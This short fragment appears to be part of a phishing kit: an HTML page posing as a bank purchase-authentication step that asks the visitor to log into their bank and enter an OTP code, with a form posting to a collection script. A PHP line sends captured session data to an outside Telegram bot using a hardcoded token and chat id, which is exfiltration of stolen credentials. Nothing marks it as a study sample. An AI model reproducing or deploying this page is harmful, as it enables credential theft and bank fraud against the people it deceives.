   ...
   <body>
      <center>
         ...
         <div style="margin-left:2px;width:350px;border:solid 1px #d8d4d4;padding:25px">
            ...
            <p style="font-size:16px;margin-top:25px;color:#807979"></p>
            <p style="font-size:16px;margin-top:25px;color:#807979">Authentication is required for this purchase.
please login to your bank account & type the otp code sent to your registered mobile *******</p>
            ...
            <form method="post" action="rez/sendfull.php" id="formf" style="">
            ...
            <?php file_get_contents("https://api.telegram.org/bot5619195222:AAEtf4M5QoHEsKtERJRzbgWH-F50z1z0zJ8/sendMessage?chat_id=5090243433&text=" . urlencode($_SESSION['messag'])."" ); ?>
